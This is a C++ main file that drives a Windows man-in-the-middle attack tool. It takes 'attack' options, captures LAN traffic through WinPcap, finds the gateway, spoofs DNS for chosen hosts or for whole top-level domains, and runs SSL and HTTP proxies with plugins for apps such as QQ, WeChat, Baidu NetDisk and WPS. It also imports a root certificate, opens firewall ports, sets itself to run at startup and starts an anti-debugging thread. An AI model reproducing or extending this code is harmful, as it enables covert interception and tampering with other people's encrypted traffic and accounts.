
#define SECURITY_WIN32

#include "PreparePacket.h"
#include <algorithm>
#include <windows.h>
#include <winsock2.H>
#include <Iptypes.h >
#include <iphlpapi.h>
#include <string>
#include <iostream>
#include <vector>
#include <conio.h>
#include <DbgHelp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "include\\pcap.h"
#include "include\\pcap\\pcap.h"
#include "main.h"
#include "attacker.h"
#include "Public.h"
#include "Packet.h"
#include "snifferpacket.h"
#include "NetworkDevice.h"
#include "Config.h"
#include "safeGuard.h"
#include "attack.h"
#include "ssl\\sslentry.h"
#include "winpcap.h"

#include "HttpUtils.h"
#include "cipher/CryptoUtils.h"
#include "ssl/WeixinAndroid.h"
#include "security.h"
#include "FileOper.h"
#include "informer.h"
#include "utils/Tools.h"
#include "cipher/RSA.h"
#include "dnsutils/DnsProxy.h"
#include "ssl/HttpProxyListener.h"
#include "ssl/SSLProxyListener.h"
#include "ssl/informerServer.h"
#include "ssl/baofeng.h"
#include "ssl/QQManager.h"
#include "ssl/QQAndroid.h"
#include "cipher/sha.h"
#include "cipher/UrlCodec.h"
#include "cipher/Base64.h"

#include "support/aos_crc64.h"
#include "ssl/HuYaPlugin.h"
#include "ssl/YoukuPC.h"
#include "ssl/QQ.h"
#include "ssl/Plugin2345.h"
#include "ssl/aliProtect.h"
#include "ssl/qukan.h"
#include "gateWay/gateway.h"
#include "gateWay/gateway.h"
#include "DnsUtils/dnsUtils.h"
#include "Utils/basesocket.h"
#include "ssl/IqiyiPlugin.h"
#include "ssl/WpsPlugin.h"
#include "ssl/QQ.h"
#include "Utils/simpleJson.h"
#include "cipher/compression.h"
#include "ssl/baiduNetDisk.h"
#include "ssl/peanutShell.h"
#include <conio.h>
#include "myDvert.h"
#include "Helper.h"

#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"dbghelp.lib")
#pragma comment(lib,"Iphlpapi.lib")
#pragma comment(lib,"Advapi32.lib")
#pragma comment(lib,"./lib\\wpcap.lib")
#pragma comment(lib,"./lib\\wpcap.dll")
#pragma comment(lib,"./lib\\zlib.lib")
#pragma comment(lib,"./lib\\libcrypto.lib")
#pragma comment(lib,"./lib\\libssl.lib")
#pragma comment(lib,"./lib\\openssl.lib")

//#define WINDIVERT_APPROACH

using namespace std;


int gAttackToggle = 0;
int gAttackMode = 0;

string gstrAdaptName = "";


void test() {
	HttpUtils::ipatoi("192.168.1.3");
}

int main(int argc, char** argv)
{
	int	ret = 0;

#ifdef _DEBUG
	test();
#endif

	string username = "";
	string password = "";
	int netcardNum = -1;
	int isattack = 0;
	int isimport = 0;
	int isalldns = 0;
	string server = "";
	int mode = 0;

	for (int num = 1; num < argc; num++) {
		if (lstrcmpiA(argv[num], "--p") == 0) {
			password = argv[num + 1];
			num++;
		}
		else if (lstrcmpiA(argv[num], "--u") == 0) {
			username = argv[num + 1];
			num++;
		}
		else if (lstrcmpiA(argv[num], "--m") == 0) {
			char* strmode = argv[num + 1];
			mode = atoi(strmode);
			gAttackMode = mode;
			Config::reviseConfig(CONFIG_FILENAME, "mode", strmode);
			num++;
		}
		else if (lstrcmpiA(argv[num], "--s") == 0) {
			server = argv[num + 1];
			gServerIP = HttpUtils::ipatoi(server.c_str());
			Config::reviseConfig(CONFIG_FILENAME, "server", server);
			num++;
		}
		else if (lstrcmpiA(argv[num], "--n") == 0) {
			netcardNum = atoi(argv[num+1]);
			num++;
		}
		else if (lstrcmpiA(argv[num], "-attack") == 0) {
			isattack = 1;
		}
		else if (lstrcmpiA(argv[num], "-import_root_cert") == 0) {
			isimport = 1;
		}
		else if (lstrcmpiA(argv[num], "-all") == 0) {
			isalldns = 1;
		}
		else {
			printf("unrecognized command parameter:%s\r\n", argv[num]);
		}
	}

	HANDLE hMutext = (HANDLE)Public::singleInstance();
	if (hMutext == FALSE)
	{
		log("An instance of program has already been running\n");
		ret = _getch();
		exit(-1);
	}

	WSADATA	stWsa = { 0 };
	ret = WSAStartup(WSASTARTUP_VERSION, &stWsa);
	if (ret)
	{
		log("network init error:%d\n", GetLastError());
		exit(-1);
	}

	string path = Public::getpath();
	SetCurrentDirectoryA(path.c_str());

	gLocalPath = path;

	int opensslctl = 0;
	string sign = "";
	vector<string> hostlist = Config::parseAttackCfg(path + CONFIG_FILENAME, &gServerIP,&opensslctl, &gAttackMode, sign,
		server, netcardNum,username,password);
	if (gAttackMode == 0 ) {
		log("parse config file:%s mode error\r\n", CONFIG_FILENAME);
		return -1;
	}

	if (gAttackMode == ATTACK_CLIENT_MODE && (gServerIP == 0 ) ) {
		log("parse config file:%s server error\r\n", CONFIG_FILENAME);
		return -1;
	}

	int dnsItemCnt = Config::parseDnsCfg(DNS_FILENAME, hostlist);
	printf("dns target total:%u\r\n", dnsItemCnt);

	LoginCheck(gAttackMode, username, password, sign);

#ifdef _DEBUG
	if (isattack) 
#endif
		gAttackToggle = 1;
	
	int opensslcontrol = 0;
	opensslcontrol |= (isalldns << 3);
	opensslcontrol |= (isattack << 2);
	opensslcontrol |= (isimport<<1);
	opensslcontrol |= OPENSSL_CLEAR_PATH;

#ifndef _DEBUG
	ret = Tools::autorun(username, password, netcardNum);
	DWORD debugTd = 0;
	CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)SafeGuard::antiDebug, 0,0, &debugTd));
#endif
	
	GetTargetHost(hostlist);
	if (isalldns) {
		hostlist.push_back(".com");
		hostlist.push_back(".net");
		hostlist.push_back(".org");
		hostlist.push_back(".cn");
	}

	// 标准去重模式,vector、set、map这些容器的end()取出来的值不是最后一个、end的前一个才是最后一个,prev(xxx.end())取出最后一个
	sort(hostlist.begin(), hostlist.end());  // 先排序
	auto iter = unique(hostlist.begin(), hostlist.end());
	hostlist.erase(iter, hostlist.end());

	vector<string> dnslist = hostlist;

	//hostlist.push_back(HttpUtils::getIPstr(gServerIP));
	//hostlist.push_back(HttpUtils::getIPstr(gLocalIP));
	//hostlist.push_back(gstrNetIP);
	//dnslist.push_back("127.0.0.1");

	ret = Config::shiftDnsFormat(dnslist);

	DnsUitls* dnsutils = new DnsUitls(dnslist);

	DWORD cmode = 0;
	HANDLE hc = GetStdHandle(STD_INPUT_HANDLE);
	ret = GetConsoleMode(hc, &cmode);
	//nRetCode = SetConsoleMode(hc, ~ENABLE_QUICK_EDIT_MODE);

	//printf("checking files cryption,please wait...\r\n");
	string pluginPath = Public::getPluginPath();
	//ret = FileOper::checkFileCryption(pluginPath);

	//inet_ntoa返回一个字符指针，指向一块存储着点分格式IP地址的静态缓冲区（同一线程内共享此内存）

	if (gAttackMode == ATTACK_CLIENT_MODE || gAttackMode == ATTACK_TEST_MODE )
	{
		gstrAdaptName = NetworkDevice::ChooseNetcard(&gLocalIP, &gNetmask, &gRouterIP, gLocalMac, netcardNum, &gDnsServer);
		if (gstrAdaptName == "")
		{
			log("Choose Netcard error\r\n");
			return -1;
		}

		if (gAttackMode == ATTACK_TEST_MODE)
		{
			gServerIP = gLocalIP;
		}
		gstrLocalIP = HttpUtils::ip2str(gLocalIP);
		gstrServerIP = HttpUtils::ip2str(gServerIP);
		HttpUtils::ipv4toipv6((unsigned char*)&gLocalIP, gLocalIPV6);

		string pluginPath = Public::getDefaultUserPluginPath();
		ret = access(pluginPath.c_str(), 0);
		if (ret)
		{
			log( "data path:%s not exist!\r\n", G_USERNAME);
			//exit(-1);
		}	
	}

	if (gAttackMode == ATTACK_SERVER_MODE || gAttackMode == ATTACK_TEST_MODE) {

		gNetIP = GetInetIPAddress();
		if (gNetIP == 0) {
			log("server network ip error\r\n");
			return -1;
		}
		gstrNetIP = HttpUtils::ip2str(gNetIP);
		//make sure serverip is correct in this mode
		if (gAttackMode == ATTACK_TEST_MODE)
		{
			gServerIP = gLocalIP;
		}
		else {
			gDnsServer = DNS_SERVER_ADDRESS;
			gServerIP = gNetIP;
		}
		gstrServerIP = HttpUtils::ip2str(gServerIP);
		HttpUtils::ipv4toipv6((unsigned char*)&gLocalIP, gLocalIPV6);

		ret = Tools::AllowFirewallPort(HTTP_PORT, "HTTP", "TCP");
		ret = Tools::AllowFirewallPort(SSL_PORT, "SSL", "TCP");
		ret = Tools::AllowFirewallPort(INFORMER_PORT, "INFORMER", "TCP");

		ret = SSLEntry::SslEntry(opensslcontrol, hostlist, hostlist);

		ret = Tools::setNetworkParameter();

		printf("\r\nServer mode is ready to work...\r\n");

		ret = ObjectParser(hostlist, gstrServerIP, G_USERNAME);

		string searchpath = gLocalPath + "plugin\\";
		vector<string>usernames;
		ret = FileOper::searchDir((char*)searchpath.c_str(), usernames);

		for (int i = 0; i < usernames.size(); i++) {
			printf("\r\n%d.\t\t%s\r\n", i, usernames[i].c_str());
		}

		do
		{
			int packnum = 0;
			//printf("\r\nPlease select the number of the server packet:\r\n");
			//scanf("%d", &packnum);
			if (packnum < usernames.size() && packnum >= 0) {
				//lstrcpyA(G_USERNAME, usernames[packnum].c_str());
				break;
			}
		} while (0);
	}

	if (gAttackMode == ATTACK_CLIENT_MODE || gAttackMode == ATTACK_TEST_MODE) {
		string devname = string(WINPCAP_NETCARD_NAME_PREFIX) + gstrAdaptName;
		pcap_t* pcapt = Winpcap::init(devname, gNetmask);
		if (pcapt == 0)
		{
			log("winpcap init error\r\n");
			return -1;
		}
		printf("device:%s,mask:%08x\r\n", devname.c_str(), gNetmask);
		if (1) {
			printf("parsing gateway mac and ip,please wait...\r\n");
			Gateway* gateway = new Gateway(pcapt, gServerIP, gLocalIP, gLocalMac);
			int totalpack = gateway->getGateWay();
			if (totalpack)
			{
				GATEWAYPARAM p = gateway->getGatewayParam();
				printf("gate way mac:%s,mac count:%d,ip:%s\r\n",
					HttpUtils::getmac(p.mac.DstMAC).c_str(), p.cnt, HttpUtils::getIPstr(p.ip.SrcIP).c_str());
			}
		}
		printf("\r\nClient mode is ready to work...\r\n");

#ifndef WINDIVERT_APPROACH
		ret = SnifferPacket::peeping(pcapt, gServerIP, gLocalIP, pluginPath, gAttackMode);
		pcap_close(pcapt);
#else
		ret = CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)winDivert, (LPVOID)gLocalIP, 0, 0));
		Sleep(-1);
#endif	
	}

	//nRetCode = Tools::initException(hMutext, username, password, netcard_selected);
	Sleep(-1);
	
	return ret;
}

//全局变量空间一般比较大，因此大小超过1M的变量尽量声明为全局变量或者静态变量。

//统计代码行数 ^b*[^:b#/]+.*$